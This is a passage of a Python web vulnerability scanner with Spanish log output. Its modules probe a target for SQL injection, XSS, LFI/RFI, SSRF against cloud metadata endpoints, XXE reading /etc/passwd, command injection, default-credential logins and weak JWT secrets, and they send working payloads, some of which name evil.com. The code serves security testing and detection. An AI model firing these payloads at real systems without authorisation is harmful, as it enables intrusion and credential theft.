            log_vuln("MEDIUM", f"Formulario sin token CSRF: action={action}, method={method}")
            findings.append({"action": action, "method": method, "issue": "No CSRF token"})
        else:
            log_ok(f"Formulario con CSRF token: action={action}")

    ctx["results"]["csrf"] = findings


# =====================================================================
#  MODULE 24: SQL INJECTION (ENHANCED)
# =====================================================================
def mod_sqli(ctx):
    section_header("SQL INJECTION PROBE (Enhanced)")
    url = ctx["target_url"]
    session = ctx["session"]
    findings = []

    # Get parameters from URL and crawler
    params = list(ctx.get("_crawled_params", set()))
    parsed = urlparse(url)
    if parsed.query:
        for k in parse_qs(parsed.query):
            if k not in params:
                params.append(k)
    if not params:
        params = ["id", "page", "search", "q", "user", "cat", "item", "product", "order"]

    log_info(f"Probando {len(params)} parametros con {len(SQLI_PAYLOADS)} payloads...")
    base = url.split("?")[0]

    for param in params:
        # Error-based SQLi
        for payload in SQLI_PAYLOADS:
            r = safe_request(session, "GET", f"{base}?{param}={quote(payload)}",
                           ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
            if not r:
                continue
            body = r.text.lower()
            for error in SQLI_ERRORS:
                if error in body:
                    log_vuln("CRITICAL", f"SQLi (error-based): param={param} payload={payload[:40]}")
                    log_info(f"  Error: {error}")
                    findings.append({"param": param, "type": "error-based", "payload": payload,
                                   "error": error, "severity": "CRITICAL"})
                    break

        # Boolean-based blind SQLi
        r_true = safe_request(session, "GET", f"{base}?{param}=1' AND '1'='1",
                            ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
        r_false = safe_request(session, "GET", f"{base}?{param}=1' AND '1'='2",
                             ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
        if r_true and r_false:
            if r_true.status_code == r_false.status_code and abs(len(r_true.content) - len(r_false.content)) > 50:
                log_vuln("HIGH", f"SQLi (blind boolean): param={param} - respuestas diferentes")
                findings.append({"param": param, "type": "blind-boolean", "severity": "HIGH"})

        # Time-based blind SQLi
        for sleep_payload in ["' AND SLEEP(5)--", "'; WAITFOR DELAY '0:0:5'--", "' AND pg_sleep(5)--"]:
            start = time.time()
            r = safe_request(session, "GET", f"{base}?{param}={quote(sleep_payload)}",
                           ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"], timeout=15)
            elapsed = time.time() - start
            if elapsed >= 4.5:
                log_vuln("CRITICAL", f"SQLi (time-based blind): param={param} delay={elapsed:.1f}s")
                findings.append({"param": param, "type": "time-based", "delay": elapsed,
                               "payload": sleep_payload, "severity": "CRITICAL"})
                break

        # POST-based SQLi
        for payload in SQLI_PAYLOADS[:8]:
            r = safe_request(session, "POST", base, ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"],
                           data={param: payload})
            if r:
                body = r.text.lower()
                for error in SQLI_ERRORS:
                    if error in body:
                        log_vuln("CRITICAL", f"SQLi POST (error-based): param={param}")
                        findings.append({"param": param, "type": "post-error-based",
                                       "payload": payload, "severity": "CRITICAL"})
                        break

    ctx["results"]["sqli"] = findings


# =====================================================================
#  MODULE 25: XSS PROBE (ENHANCED)
# =====================================================================
def mod_xss(ctx):
    section_header("XSS PROBE (Enhanced)")
    url = ctx["target_url"]
    session = ctx["session"]
    findings = []

    params = list(ctx.get("_crawled_params", set()))
    parsed = urlparse(url)
    if parsed.query:
        for k in parse_qs(parsed.query):
            if k not in params:
                params.append(k)
    if not params:
        params = ["search", "q", "query", "s", "name", "id", "redirect", "url", "page",
                  "input", "text", "msg", "message", "comment"]

    base = url.split("?")[0]
    log_info(f"Probando {len(params)} parametros con {len(XSS_PAYLOADS)} payloads...")

    for param in params:
        # Reflection test first
        canary = f"xss{random.randint(10000,99999)}test"
        r = safe_request(session, "GET", f"{base}?{param}={canary}",
                        ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
        if not r or canary not in r.text:
            continue

        log_info(f"Parametro '{param}' refleja input - probando payloads...")

        for payload in XSS_PAYLOADS:
            r = safe_request(session, "GET", f"{base}?{param}={quote(payload)}",
                           ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
            if not r:
                continue

            # Check if payload is reflected unencoded
            if payload in r.text:
                log_vuln("HIGH", f"XSS reflejado: param={param} payload={payload[:50]}")
                findings.append({"param": param, "type": "reflected", "payload": payload,
                               "severity": "HIGH"})
                break
            # Check for partial reflection (tag not stripped)
            if "<script" in payload and "<script" in r.text:
                log_vuln("MEDIUM", f"XSS parcial (script tag no filtrado): param={param}")
                findings.append({"param": param, "type": "partial", "payload": payload,
                               "severity": "MEDIUM"})
                break
            if "onerror" in payload and "onerror" in r.text:
                log_vuln("MEDIUM", f"XSS parcial (event handler no filtrado): param={param}")
                findings.append({"param": param, "type": "partial-event", "payload": payload,
                               "severity": "MEDIUM"})
                break

        # POST XSS
        for payload in XSS_PAYLOADS[:5]:
            r = safe_request(session, "POST", base, ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"],
                           data={param: payload})
            if r and payload in r.text:
                log_vuln("HIGH", f"XSS POST reflejado: param={param}")
                findings.append({"param": param, "type": "post-reflected", "payload": payload,
                               "severity": "HIGH"})
                break

    # DOM XSS indicators
    r = safe_request(session, "GET", url, ctx["rate_limiter"])
    if r:
        dom_sinks = ["document.write(", "innerHTML", "outerHTML", "eval(", "setTimeout(",
                     "setInterval(", "document.location", "window.location", "location.href",
                     "location.hash", "location.search", "document.URL", "document.referrer",
                     "document.cookie", "$.html(", "$.append("]
        dom_sources = ["location.hash", "location.search", "location.href", "document.URL",
                       "document.referrer", "window.name", "document.cookie"]
        body = r.text
        for sink in dom_sinks:
            if sink in body:
                log_vuln("LOW", f"DOM XSS sink encontrado: {sink}")
                findings.append({"type": "dom-sink", "value": sink, "severity": "LOW"})

    ctx["results"]["xss"] = findings


# =====================================================================
#  MODULE 26: LFI PROBE (ENHANCED)
# =====================================================================
def mod_lfi(ctx):
    section_header("LFI PROBE (Enhanced)")
    url = ctx["target_url"]
    session = ctx["session"]
    findings = []

    params = ["file", "path", "page", "include", "dir", "document", "folder",
              "root", "pg", "style", "template", "php_path", "doc", "view",
              "content", "layout", "mod", "conf", "load", "read", "lang"]

    base = url.split("?")[0]
    lfi_indicators = ["root:", "/bin/", "daemon:", "nobody:", "[boot loader]",
                      "[fonts]", "for 16-bit app support", "localhost",
                      "PD9waH", "<?php", "<?=", "class ", "function "]

    log_info(f"Probando {len(params)} parametros con {len(LFI_PAYLOADS)} payloads...")

    for param in params:
        for payload in LFI_PAYLOADS:
            r = safe_request(session, "GET", f"{base}?{param}={quote(payload)}",
                           ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
            if not r:
                continue

            body = r.text
            for indicator in lfi_indicators:
                if indicator in body:
                    sev = "CRITICAL" if "root:" in body or "/bin/" in body else "HIGH"
                    log_vuln(sev, f"LFI: param={param} payload={payload[:50]}")
                    log_info(f"  Indicador: {indicator}")
                    findings.append({"param": param, "payload": payload,
                                   "indicator": indicator, "severity": sev})
                    break

    ctx["results"]["lfi"] = findings


# =====================================================================
#  MODULE 27: RFI PROBE
# =====================================================================
def mod_rfi(ctx):
    section_header("RFI PROBE")
    url = ctx["target_url"]
    session = ctx["session"]
    findings = []

    params = ["file", "path", "page", "include", "url", "document", "load",
              "template", "src", "href", "fetch"]

    base = url.split("?")[0]
    # Payloads que no hacen requests reales pero detectan la vulnerabilidad
    rfi_payloads = [
        "//evil.com/shell.txt",
        "https://evil.com/shell.txt%00",
        "\\\\evil.com\\shell.txt",
        "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pg==",
        "php://input",
        "expect://id",
    ]

    for param in params:
        for payload in rfi_payloads:
            r = safe_request(session, "GET", f"{base}?{param}={quote(payload)}",
                           ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
            if r and r.status_code == 200:
                # Check if it tried to fetch the remote file (error messages)
                body = r.text.lower()
                rfi_indicators = ["failed to open stream", "include(http", "include(ftp",
                                 "url file-access is disabled", "allow_url_include",
                                 "failed opening", "wrapper is disabled"]
                for ind in rfi_indicators:
                    if ind in body:
                        log_vuln("HIGH", f"RFI indicador: param={param} -> {ind}")
                        findings.append({"param": param, "payload": payload,
                                       "indicator": ind, "severity": "HIGH"})
                        break

    ctx["results"]["rfi"] = findings


# =====================================================================
#  MODULE 28: OPEN REDIRECT
# =====================================================================
def mod_open_redirect(ctx):
    section_header("OPEN REDIRECT")
    url = ctx["target_url"]
    session = ctx["session"]
    findings = []

    params = ["redirect","url","next","return","rurl","redirect_url","return_url",
              "goto","target","dest","destination","continue","callback",
              "forward","out","view","ref","login_url","logout","r","u","link"]
    payloads = [
        "https://evil.com","//evil.com","///evil.com",
        "/\\evil.com","////evil.com",
        "https://evil.com%00.legit.com",
        "https://evil.com?.legit.com",
        "https://evil.com#.legit.com",
        "https://evil.com\\.legit.com",
        "https://evil.com@legit.com",
        "javascript:alert(1)",
        "data:text/html,<script>alert(1)</script>",
        "https://evil.com/%0d%0a",
        "//evil%00.com",
    ]

    base = url.split("?")[0]
    for param in params:
        for payload in payloads:
            r = safe_request(session, "GET", f"{base}?{param}={quote(payload)}",
                           ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"],
                           allow_redirects=False)
            if not r:
                continue
            if r.status_code in (301, 302, 303, 307, 308):
                location = r.headers.get("Location", "")
                if "evil.com" in location or location.startswith("//evil") or location.startswith("javascript:"):
                    log_vuln("MEDIUM", f"Open Redirect: param={param} -> {location[:60]}")
                    findings.append({"param": param, "payload": payload,
                                   "redirect": location, "severity": "MEDIUM"})
                    break

    ctx["results"]["open_redirect"] = findings


# =====================================================================
#  MODULE 29: CRLF INJECTION
# =====================================================================
def mod_crlf(ctx):
    section_header("CRLF INJECTION")
    url = ctx["target_url"]
    session = ctx["session"]
    findings = []

    payloads = [
        "%0d%0aX-Injected: CRLF",
        "%0aX-Injected: CRLF",
        "%0dX-Injected: CRLF",
        "%E5%98%8A%E5%98%8DX-Injected: CRLF",
        "\\r\\nX-Injected: CRLF",
        "%0d%0a%0d%0a<script>alert(1)</script>",
        "\r\nSet-Cookie: crlf=injected",
        "%0d%0aSet-Cookie:%20crlf=injected",
    ]

    base = url.split("?")[0]
    test_params = ["url","redirect","return","next","goto","path","page"]

    for param in test_params:
        for payload in payloads:
            test_url = f"{base}?{param}={payload}"
            r = safe_request(session, "GET", test_url, ctx["rate_limiter"],
                           ctx["mode_config"]["rotate_ua"])
            if not r:
                continue
            headers_str = str(r.headers).lower()
            if "x-injected" in headers_str or "crlf=injected" in headers_str:
                log_vuln("HIGH", f"CRLF Injection: param={param}")
                findings.append({"param": param, "payload": payload, "severity": "HIGH"})
                break

    ctx["results"]["crlf"] = findings


# =====================================================================
#  MODULE 30: HOST HEADER INJECTION
# =====================================================================
def mod_host_header(ctx):
    section_header("HOST HEADER INJECTION")
    url = ctx["target_url"]
    session = ctx["session"]
    findings = []

    tests = [
        {"Host": "evil.com"},
        {"Host": f"{ctx['domain']}", "X-Forwarded-Host": "evil.com"},
        {"Host": f"{ctx['domain']}", "X-Forwarded-Server": "evil.com"},
        {"Host": f"{ctx['domain']}", "X-Original-URL": "/admin"},
        {"Host": f"{ctx['domain']}", "X-Rewrite-URL": "/admin"},
        {"Host": f"{ctx['domain']}\r\nX-Injected: true"},
    ]

    for test_headers in tests:
        ctx["rate_limiter"].wait()
        r = safe_request(session, "GET", url, headers=test_headers,
                        rotate_ua=ctx["mode_config"]["rotate_ua"])
        if not r:
            continue
        body = r.text.lower()
        if "evil.com" in body or "evil.com" in str(r.headers).lower():
            header_name = [k for k in test_headers if k != "Host"][0] if len(test_headers) > 1 else "Host"
            log_vuln("MEDIUM", f"Host Header Injection via {header_name}")
            findings.append({"header": header_name, "severity": "MEDIUM"})

    ctx["results"]["host_header"] = findings


# =====================================================================
#  MODULE 31: SSRF DETECTION
# =====================================================================
def mod_ssrf(ctx):
    section_header("SSRF DETECTION")
    url = ctx["target_url"]
    session = ctx["session"]
    findings = []

    params = ["url","uri","path","dest","redirect","src","source","target",
              "rurl","domain","feed","host","site","html","data","reference",
              "page","load","fetch","file","link","img","image","proxy","callback"]

    ssrf_payloads = [
        "http://169.254.169.254/latest/meta-data/",
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/v1/",
        "http://100.100.100.200/latest/meta-data/",
        "http://127.0.0.1:80","http://127.0.0.1:22","http://127.0.0.1:3306",
        "http://localhost:80","http://0.0.0.0:80",
        "http://[::1]:80","http://0177.0.0.1:80",
        "http://2130706433:80",  # 127.0.0.1 as decimal
        "http://017700000001:80",  # 127.0.0.1 as octal
        "file:///etc/passwd",
        "dict://127.0.0.1:6379/info",
        "gopher://127.0.0.1:6379/_INFO",
    ]

    base = url.split("?")[0]
    for param in params:
        for payload in ssrf_payloads:
            r = safe_request(session, "GET", f"{base}?{param}={quote(payload)}",
                           ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
            if not r:
                continue
            body = r.text.lower()
            ssrf_indicators = ["ami-id","instance-id","instance-type","availability-zone",
                              "iam/security-credentials","compute/v1","meta-data",
                              "root:","daemon:","redis_version","connected_clients",
                              "127.0.0.1","localhost","internal","private"]
            for ind in ssrf_indicators:
                if ind in body:
                    log_vuln("CRITICAL", f"SSRF: param={param} payload={payload[:50]} -> {ind}")
                    findings.append({"param": param, "payload": payload,
                                   "indicator": ind, "severity": "CRITICAL"})
                    break

        # POST SSRF
        for payload in ssrf_payloads[:5]:
            r = safe_request(session, "POST", base, ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"],
                           data={param: payload})
            if r:
                body = r.text.lower()
                for ind in ["ami-id","instance-id","root:","redis_version"]:
                    if ind in body:
                        log_vuln("CRITICAL", f"SSRF POST: param={param} -> {ind}")
                        findings.append({"param": param, "payload": payload,
                                       "type": "POST", "indicator": ind, "severity": "CRITICAL"})
                        break

    ctx["results"]["ssrf"] = findings


# =====================================================================
#  MODULE 32: SSTI DETECTION
# =====================================================================
def mod_ssti(ctx):
    section_header("SSTI DETECTION")
    url = ctx["target_url"]
    session = ctx["session"]
    findings = []

    params = list(ctx.get("_crawled_params", set())) or ["name","search","q","template","page","view","msg","text","input"]
    base = url.split("?")[0]

    log_info(f"Probando {len(params)} parametros con {len(SSTI_PAYLOADS)} payloads...")

    for param in params:
        for payload, expected in SSTI_PAYLOADS:
            r = safe_request(session, "GET", f"{base}?{param}={quote(payload)}",
                           ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
            if not r:
                continue
            if expected in r.text:
                log_vuln("CRITICAL", f"SSTI: param={param} payload={payload[:40]} -> {expected}")
                findings.append({"param": param, "payload": payload, "expected": expected,
                               "severity": "CRITICAL"})
                break

    ctx["results"]["ssti"] = findings


# =====================================================================
#  MODULE 33: COMMAND INJECTION
# =====================================================================
def mod_cmdi(ctx):
    section_header("COMMAND INJECTION")
    url = ctx["target_url"]
    session = ctx["session"]
    findings = []

    params = ["cmd","command","exec","run","ping","ip","host","domain","target",
              "query","search","input","data","dir","path","file"]
    base = url.split("?")[0]

    log_info(f"Probando {len(params)} parametros (time-based)...")

    for param in params:
        for payload, expected_delay in CMDI_PAYLOADS:
            start = time.time()
            r = safe_request(session, "GET", f"{base}?{param}=127.0.0.1{quote(payload)}",
                           ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"], timeout=15)
            elapsed = time.time() - start

            if elapsed >= expected_delay * 0.8:
                log_vuln("CRITICAL", f"Command Injection (time-based): param={param} delay={elapsed:.1f}s")
                findings.append({"param": param, "payload": payload, "delay": elapsed,
                               "severity": "CRITICAL"})
                break

            # Check for output-based
            if r:
                body = r.text
                cmdi_indicators = ["uid=","gid=","groups=","root:","bin/","total ","drw",
                                  "volume serial number","directory of","windows"]
                for ind in cmdi_indicators:
                    if ind in body.lower():
                        log_vuln("CRITICAL", f"Command Injection (output): param={param} -> {ind}")
                        findings.append({"param": param, "payload": payload,
                                       "indicator": ind, "severity": "CRITICAL"})
                        break

    ctx["results"]["cmdi"] = findings


# =====================================================================
#  MODULE 34: XXE DETECTION
# =====================================================================
def mod_xxe(ctx):
    section_header("XXE DETECTION")
    url = ctx["target_url"]
    session = ctx["session"]
    findings = []

    # Test endpoints that might accept XML
    xml_endpoints = [url, f"{ctx['base_url']}/api", f"{ctx['base_url']}/upload",
                     f"{ctx['base_url']}/import", f"{ctx['base_url']}/xmlrpc.php",
                     f"{ctx['base_url']}/soap", f"{ctx['base_url']}/wsdl"]

    xxe_payloads = [
        ('<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
         '<test>&xxe;</test>'),
        ('<?xml version="1.0"?><!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>'
         '<test>&xxe;</test>'),
        ('<?xml version="1.0"?><!DOCTYPE test [<!ENTITY % xxe SYSTEM "file:///etc/passwd">'
         '<!ENTITY test "&#37;xxe;">]><test>&test;</test>'),
    ]

    content_types = ["application/xml", "text/xml", "application/soap+xml"]

    for endpoint in xml_endpoints:
        for payload in xxe_payloads:
            for ct in content_types:
                r = safe_request(session, "POST", endpoint, ctx["rate_limiter"],
                               ctx["mode_config"]["rotate_ua"],
                               data=payload, headers={"Content-Type": ct})
                if not r:
                    continue
                body = r.text.lower()
                if any(ind in body for ind in ["root:", "/bin/", "daemon:", "nobody:"]):
                    log_vuln("CRITICAL", f"XXE: {endpoint}")
                    findings.append({"endpoint": endpoint, "payload": payload[:60],
                                   "severity": "CRITICAL"})
                    break
                # Check for XXE error indicators
                if any(ind in body for ind in ["parser error", "entity", "dtd", "xml parsing"]):
                    log_vuln("LOW", f"XXE: XML parser expuesto en {endpoint}")
                    findings.append({"endpoint": endpoint, "type": "parser_exposed",
                                   "severity": "LOW"})

    ctx["results"]["xxe"] = findings


# =====================================================================
#  MODULE 35: HTTP PARAMETER POLLUTION
# =====================================================================
def mod_hpp(ctx):
    section_header("HTTP PARAMETER POLLUTION")
    url = ctx["target_url"]
    session = ctx["session"]
    findings = []

    base = url.split("?")[0]
    test_params = list(ctx.get("_crawled_params", set())) or ["id", "search", "q", "page", "user"]

    for param in test_params[:10]:
        # Send duplicate parameters with different values
        r = safe_request(session, "GET", f"{base}?{param}=value1&{param}=value2",
                        ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"])
        if not r:
            continue

        body = r.text
        if "value1" in body and "value2" in body:
            log_vuln("LOW", f"HPP: param={param} - ambos valores reflejados")
            findings.append({"param": param, "type": "both_reflected", "severity": "LOW"})
        elif "value2" in body and "value1" not in body:
            log_info(f"HPP: param={param} - ultimo valor prevalece")
        elif "value1" in body and "value2" not in body:
            log_info(f"HPP: param={param} - primer valor prevalece")

    ctx["results"]["hpp"] = findings


# =====================================================================
#  MODULE 36: SUBDOMAIN TAKEOVER
# =====================================================================
def mod_subdomain_takeover(ctx):
    section_header("SUBDOMAIN TAKEOVER")
    session = ctx["session"]
    findings = []
    subdomains = [s["subdomain"] for s in ctx["results"].get("subdomains", [])]

    if not subdomains:
        log_info("No hay subdominios para verificar.")
        return

    takeover_signatures = {
        "GitHub Pages": ["there isn't a github pages site here", "for root urls, please contact support"],
        "Heroku": ["no such app", "herokucdn.com/error-pages", "no-such-app.html"],
        "AWS S3": ["nosuchbucket", "the specified bucket does not exist"],
        "Shopify": ["sorry, this shop is currently unavailable"],
        "Tumblr": ["there's nothing here", "whatever you were looking for doesn't currently exist"],
        "WordPress.com": ["do you want to register"],
        "Fastly": ["fastly error: unknown domain"],
        "Pantheon": ["404 error unknown site"],
        "Zendesk": ["help center closed", "this help center no longer exists"],
        "Surge.sh": ["project not found"],
        "Fly.io": ["404 not found"],
        "Netlify": ["not found - request id"],
        "Bitbucket": ["repository not found"],
        "Ghost": ["the thing you were looking for is no longer here"],
        "Azure": ["the resource you are looking for has been removed"],
        "Google Cloud": ["the requested url was not found"],
        "Cargo": ["cargocollective.com/404"],
        "Unbounce": ["the requested url was not found on this server"],
    }

    for sub in subdomains:
        ctx["rate_limiter"].wait()
        # Check CNAME
        try:
            cname = None
            if dns:
                answers = dns.resolver.resolve(sub, "CNAME")
                cname = str(answers[0].target).rstrip(".")
        except Exception:
            pass

        # Check HTTP response
        for proto in ["https", "http"]:
            r = safe_request(session, "GET", f"{proto}://{sub}", ctx["rate_limiter"],
                           ctx["mode_config"]["rotate_ua"])
            if not r:
                if cname:
                    # DNS resolves but HTTP fails - potential takeover
                    log_vuln("MEDIUM", f"Posible takeover: {sub} (CNAME: {cname}, HTTP fallo)")
                    findings.append({"subdomain": sub, "cname": cname, "type": "no_http"})
                continue

            body = r.text.lower()
            for provider, sigs in takeover_signatures.items():
                if any(s in body for s in sigs):
                    log_vuln("HIGH", f"Subdomain Takeover: {sub} ({provider})")
                    if cname:
                        log_info(f"  CNAME: {cname}")
                    findings.append({"subdomain": sub, "provider": provider,
                                   "cname": cname, "severity": "HIGH"})
                    break
            break  # Only check one protocol

    ctx["results"]["subdomain_takeover"] = findings


# =====================================================================
#  MODULE 37: DEFAULT CREDENTIALS
# =====================================================================
def mod_default_creds(ctx):
    section_header("DEFAULT CREDENTIALS")
    base = ctx["base_url"]
    session = ctx["session"]
    findings = []

    login_paths = ["admin","login","wp-login.php","administrator","user/login",
                   "auth/login","manager/html","phpmyadmin","adminer.php",
                   "webmail","cpanel","panel","dashboard/login","signin"]

    for path in login_paths:
        r = safe_request(session, "GET", f"{base}/{path}", ctx["rate_limiter"],
                        ctx["mode_config"]["rotate_ua"])
        if not r or r.status_code not in (200, 401):
            continue

        log_info(f"Login encontrado: /{path} - probando credenciales...")

        for user, pwd in DEFAULT_CREDS:
            ctx["rate_limiter"].wait()
            # Try POST
            r = safe_request(session, "POST", f"{base}/{path}",
                           ctx["rate_limiter"], ctx["mode_config"]["rotate_ua"],
                           data={"username": user, "password": pwd, "login": "Login",
                                 "user": user, "pass": pwd, "log": user, "pwd": pwd},
                           allow_redirects=True)
            if not r:
                continue

            # Check for successful login indicators
            body = r.text.lower()
            success_indicators = ["dashboard","welcome","logout","sign out","profile",
                                "admin panel","control panel","my account"]
            fail_indicators = ["invalid","incorrect","wrong","error","failed","denied",
                             "bad credentials","login failed"]

            if any(s in body for s in success_indicators) and not any(f in body for f in fail_indicators):
                log_vuln("CRITICAL", f"Default creds: /{path} -> {user}:{pwd}")
                findings.append({"path": path, "username": user, "password": pwd,
                               "severity": "CRITICAL"})
                break

            # Check for redirect to dashboard
            if r.status_code in (301, 302, 303, 307):
                loc = r.headers.get("Location", "").lower()
                if any(s in loc for s in ["dashboard","admin","panel","home","index"]):
                    log_vuln("CRITICAL", f"Default creds (redirect): /{path} -> {user}:{pwd}")
                    findings.append({"path": path, "username": user, "password": pwd,
                                   "severity": "CRITICAL"})
                    break

    ctx["results"]["default_creds"] = findings


# =====================================================================
#  MODULE 38: JWT ANALYSIS
# =====================================================================
def mod_jwt_analysis(ctx):
    section_header("JWT ANALYSIS")
    url = ctx["target_url"]
    session = ctx["session"]
    findings = []

    # Search for JWTs in responses
    r = safe_request(session, "GET", url, ctx["rate_limiter"])
    if not r:
        return

    # JWT regex pattern
    jwt_pattern = r'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+'
    all_text = r.text + str(r.headers) + str(r.cookies.get_dict())
    tokens = re.findall(jwt_pattern, all_text)

    if not tokens:
        log_info("No se encontraron JWTs.")
        return

    for token in set(tokens):
        log_ok(f"JWT encontrado: {token[:50]}...")
        try:
            # Decode header
            header_b64 = token.split(".")[0]
            header_b64 += "=" * (4 - len(header_b64) % 4)
            header = json.loads(base64.urlsafe_b64decode(header_b64))
            log_info(f"  Header: {json.dumps(header)}")

            # Decode payload
            payload_b64 = token.split(".")[1]
            payload_b64 += "=" * (4 - len(payload_b64) % 4)
            payload = json.loads(base64.urlsafe_b64decode(payload_b64))
            log_info(f"  Payload: {json.dumps(payload)[:200]}")

            # Check algorithm
            alg = header.get("alg", "")
            if alg.lower() == "none":
                log_vuln("CRITICAL", "JWT usa algoritmo 'none' - sin firma!")
                findings.append({"token": token[:50], "issue": "alg=none", "severity": "CRITICAL"})
            elif alg.upper() in ("HS256", "HS384", "HS512"):
                log_vuln("LOW", f"JWT usa HMAC ({alg}) - verificar secreto debil")
                findings.append({"token": token[:50], "issue": f"HMAC {alg}", "severity": "LOW"})

                # Try common weak secrets
                weak_secrets = ["secret","password","123456","key","admin","test",
                               "jwt_secret","changeme","default","supersecret"]
                import hmac as hmac_module
                import hashlib as hl
                header_payload = ".".join(token.split(".")[:2])
                sig = token.split(".")[2]
                for secret in weak_secrets:
                    computed = base64.urlsafe_b64encode(
                        hmac_module.new(secret.encode(), header_payload.encode(),
                                       hl.sha256).digest()
                    ).rstrip(b"=").decode()
                    if computed == sig:
                        log_vuln("CRITICAL", f"JWT secreto debil: '{secret}'")
                        findings.append({"token": token[:50], "issue": f"weak_secret: {secret}",
                                       "severity": "CRITICAL"})
                        break

            # Check expiration
            exp = payload.get("exp")
            if exp:
                if exp < time.time():
                    log_vuln("LOW", "JWT expirado pero aun aceptado")
                    findings.append({"token": token[:50], "issue": "expired", "severity": "LOW"})

            # Check for sensitive data
            sensitive_keys = ["password","secret","ssn","credit_card","api_key","private"]
            for key in payload:
                if any(s in key.lower() for s in sensitive_keys):
                    log_vuln("MEDIUM", f"JWT contiene dato sensible: {key}")
                    findings.append({"token": token[:50], "issue": f"sensitive_data: {key}",
                                   "severity": "MEDIUM"})

        except Exception as e:
            log_fail(f"  Error decodificando JWT: {e}")

    ctx["results"]["jwt"] = findings


# =====================================================================
#  MODULE 39: GRAPHQL TESTING
# =====================================================================
def mod_graphql(ctx):
    section_header("GRAPHQL TESTING")
    base = ctx["base_url"]
    session = ctx["session"]
    findings = []

    # Find GraphQL endpoints
    gql_paths = ["graphql","graphiql","graphql/console","api/graphql","gql",
                 "v1/graphql","v2/graphql","query","altair"]
    gql_endpoint = None

    for path in gql_paths:
        r = safe_request(session, "GET", f"{base}/{path}", ctx["rate_limiter"],
                        ctx["mode_config"]["rotate_ua"])
        if r and r.status_code in (200, 400):
            ct = r.headers.get("Content-Type", "")
            if "json" in ct or "graphql" in ct or "graphiql" in r.text.lower():
                gql_endpoint = f"{base}/{path}"
                log_ok(f"GraphQL endpoint: /{path}")
                break

    if not gql_endpoint:
        log_info("No se encontro endpoint GraphQL.")
        return

    # Introspection query
    introspection = '{"query":"{ __schema { types { name fields { name } } } }"}'
    r = safe_request(session, "POST", gql_endpoint, ctx["rate_limiter"],
                    ctx["mode_config"]["rotate_ua"],
                    data=introspection, headers={"Content-Type": "application/json"})
    if r and r.status_code == 200:
        try:
            data = r.json()
            if "data" in data and "__schema" in data["data"]:
                types = data["data"]["__schema"]["types"]
                log_vuln("MEDIUM", f"GraphQL introspection habilitada! ({len(types)} types)")
                findings.append({"issue": "introspection_enabled", "types": len(types),
                               "severity": "MEDIUM"})
                # List interesting types
                for t in types:
                    name = t.get("name", "")
                    if not name.startswith("__") and t.get("fields"):
                        field_names = [f["name"] for f in t["fields"][:10]]
                        log_info(f"  Type: {name} -> {', '.join(field_names)}")
        except Exception:
            pass

    # Test for batching DoS
    batch_query = json.dumps([{"query": "{ __typename }"} for _ in range(10)])
    r = safe_request(session, "POST", gql_endpoint, ctx["rate_limiter"],
                    ctx["mode_config"]["rotate_ua"],
                    data=batch_query, headers={"Content-Type": "application/json"})
    if r and r.status_code == 200:
        try:
            data = r.json()
            if isinstance(data, list) and len(data) >= 10:
                log_vuln("LOW", "GraphQL permite batch queries (posible DoS)")
                findings.append({"issue": "batch_queries", "severity": "LOW"})
        except Exception:
            pass

    # SQLi in GraphQL
    sqli_query = '{"query":"{ user(id: \\"1 OR 1=1--\\") { name } }"}'
    r = safe_request(session, "POST", gql_endpoint, ctx["rate_limiter"],
                    ctx["mode_config"]["rotate_ua"],
                    data=sqli_query, headers={"Content-Type": "application/json"})
    if r:
        body = r.text.lower()
        for error in SQLI_ERRORS:
            if error in body:
                log_vuln("CRITICAL", "GraphQL SQLi: errores SQL en respuesta")
                findings.append({"issue": "sqli_in_graphql", "severity": "CRITICAL"})
                break

    ctx["results"]["graphql"] = findings


# =====================================================================
#  MODULE 40: WEBSOCKET TESTING
# =====================================================================
def mod_websocket(ctx):
    section_header("WEBSOCKET TESTING")
    host = ctx["target_host"]
    base = ctx["base_url"]
    session = ctx["session"]
    findings = []

    ws_paths = ["/ws", "/websocket", "/socket.io/", "/sockjs/", "/hub",
                "/realtime", "/live", "/stream", "/events", "/notifications"]

    for path in ws_paths:
        ctx["rate_limiter"].wait()
        ws_url = f"{base}{path}"
        # Try HTTP upgrade request
        r = safe_request(session, "GET", ws_url, headers={
            "Upgrade": "websocket",
            "Connection": "Upgrade",
            "Sec-WebSocket-Key": base64.b64encode(os.urandom(16)).decode(),
            "Sec-WebSocket-Version": "13"
        }, rotate_ua=ctx["mode_config"]["rotate_ua"])

        if r and r.status_code == 101:
            log_ok(f"WebSocket endpoint: {path}")
            findings.append({"path": path, "status": 101})
        elif r and r.status_code == 200:
            # Socket.IO might respond with 200
            if "websocket" in r.text.lower() or "socket.io" in r.text.lower():
                log_ok(f"WebSocket/Socket.IO endpoint: {path}")
                findings.append({"path": path, "status": 200, "type": "socket.io"})

        # Check for missing origin validation
        r2 = safe_request(session, "GET", ws_url, headers={
            "Upgrade": "websocket",
            "Connection": "Upgrade",
            "Sec-WebSocket-Key": base64.b64encode(os.urandom(16)).decode(),
            "Sec-WebSocket-Version": "13",
            "Origin": "https://evil.com"
        }, rotate_ua=ctx["mode_config"]["rotate_ua"])

        if r2 and r2.status_code == 101:
            log_vuln("HIGH", f"WebSocket sin validacion de Origin: {path}")
            findings.append({"path": path, "issue": "no_origin_check", "severity": "HIGH"})

